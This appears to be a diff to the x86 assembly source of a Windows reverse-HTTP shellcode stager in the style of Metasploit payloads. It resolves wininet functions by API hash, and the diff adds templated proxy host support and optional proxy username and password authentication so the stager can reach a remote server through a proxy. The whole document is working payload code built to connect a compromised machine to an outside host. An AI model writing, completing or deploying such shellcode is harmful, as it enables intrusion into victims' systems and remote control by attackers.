@@ -16,24 +16,24 @@ load_wininet:
   push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
   call ebp               ; LoadLibraryA( "wininet" )
 
-call internetopen
+  call internetopen
 
 proxy_server_name:
-	db "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:55555",0x00
+  db "PROXYHOST:PORT",0x00
 
 internetopen:
-  mov ecx, esp
+  pop ecx                ; pointer to proxy_server_name
   xor edi,edi
   push edi               ; DWORD dwFlags
-  push edi               ; LPCTSTR lpszProxyBypass
+  push esp               ; LPCTSTR lpszProxyBypass (empty)
   push ecx               ; LPCTSTR lpszProxyName
   push byte 3            ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY  = 3)
-  push byte 0            ; NULL pointer  
-  push esp               ; LPCTSTR lpszAgent ("\x00")
+  push byte 0            ; NULL pointer
+;  push esp               ; LPCTSTR lpszAgent ("\x00") // doesn't seem to work with this
   push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
   call ebp
 
-  jmp short dbl_get_server_host
+  jmp dbl_get_server_host 
 
 internetconnect:
   pop ebx                ; Save the hostname pointer
@@ -48,6 +48,37 @@ internetconnect:
   push eax               ; HINTERNET hInternet
   push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
   call ebp
+
+  mov esi,eax		 ; safe hConnection
+
+  db "PROXY_AUTH_START" 	 ; start marker for optional authentification, removed during payload creation
+
+  call set_proxy_username
+proxy_username:
+  db "PROXY_USERNAME",0x00
+set_proxy_username:
+  pop ecx                ; Save the proxy username
+  push dword 15 	 ; DWORD dwBufferLength
+  push ecx  	 	 ; LPVOID lpBuffer (username)
+  push byte 43           ; DWORD dwOption (INTERNET_OPTION_PROXY_USERNAME)
+  push esi		 ; hConnection
+  push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
+  call ebp
+
+  call set_proxy_password
+proxy_password:
+  db "PROXY_PASSWORD",0x00
+set_proxy_password:
+  pop ecx                ; Save the proxy password
+  push dword 15		 ; DWORD dwBufferLength
+  push ecx  	 	 ; LPVOID lpBuffer (password)
+  push byte 44           ; DWORD dwOption (INTERNET_OPTION_PROXY_PASSWORD)
+  push esi		 ; hConnection
+  push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
+  call ebp
+
+  db "PROXY_AUTH_STOP"   	 ; stop marker for optional authentification, removed during payload creation
+
 
   jmp get_server_uri
 
@@ -68,7 +99,7 @@ httpopenrequest:
   push edx               ; version
   push ecx               ; url
   push edx               ; method
-  push eax               ; hConnection
+  push esi               ; hConnection
   push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
   call ebp
   mov esi, eax           ; hHttpRequest
